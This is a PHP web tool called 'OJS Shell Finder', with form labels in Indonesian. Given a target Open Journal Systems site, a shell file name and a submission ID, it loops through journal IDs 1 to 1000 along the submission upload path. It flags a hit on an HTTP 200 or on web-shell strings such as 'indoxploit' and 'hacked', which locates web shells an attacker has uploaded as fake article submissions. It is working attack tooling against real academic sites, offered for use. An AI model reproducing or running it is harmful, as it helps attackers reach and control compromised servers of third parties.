<?php
set_time_limit(0);
error_reporting(0);
function ngcurl($url) {
	$ch = curl_init($url);
	  	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	return curl_exec($ch);
	  	  curl_close($ch);
}
function respon_code($url) {
	$ch = curl_init($url);
	  	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$res = curl_exec($ch);
	return curl_getinfo($ch, CURLINFO_HTTP_CODE);
	  	  curl_close($ch);
}

?>
<?php
$judul=@OJS_Shell_Finder;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p>Open Journal System - Shell Finder</p></div>
    <div class="card-body">
      <div class="table-responsive">
          <center>
<form method="POST" action="" name="form">
	<table>
		<tr>
	<td>Site</td><td> : </td>
	<td><input type="text" name="link" class="form-control text-primary" placeholder="http://anym.ac.id"></td>
		</tr>
		<tr>
	<td>Nama Shell</td><td> : </td>
	<td><input type="text" name="shell" class="form-control text-primary" placeholder="86-247-3-SM.phtml(nama shell)"></td>
	</tr>
	<tr>
	<td>ID</td><td> :</td>
	<td><input type="text" name="id" class="form-control text-primary" placeholder="86(id)"></td>
	</tr>
	<td>
	<input type="submit" name="submit" class="btn btn-outline-primary" value="submit">
	</td>
</table>
</form>

<style type="text/css">
	input {
		width: 160%;
	}
</style>
<?php
$url = $_POST['link'];
$shell = $_POST['shell'];
$id = $_POST['id'];
if(isset($_POST['submit'])) {
	for($x = 1; $x <= 1000; $x++) {
		$link = "$url/files/journals/$x/articles/$id/submission/original/$shell";
		$cek = ngcurl($link);
		if(preg_match("/shell|newfile|newfolder|marijuana|pass|password|text|indoxploit|upload|eval|php|hacked|linux|windows|by|here/i", $cek) OR respon_code($link) == "200") {
			echo "-> <a target='_blank' href=".$link.">$link<a>";
			break;
		} else { echo "NOT FOUND";}
	}
}
?>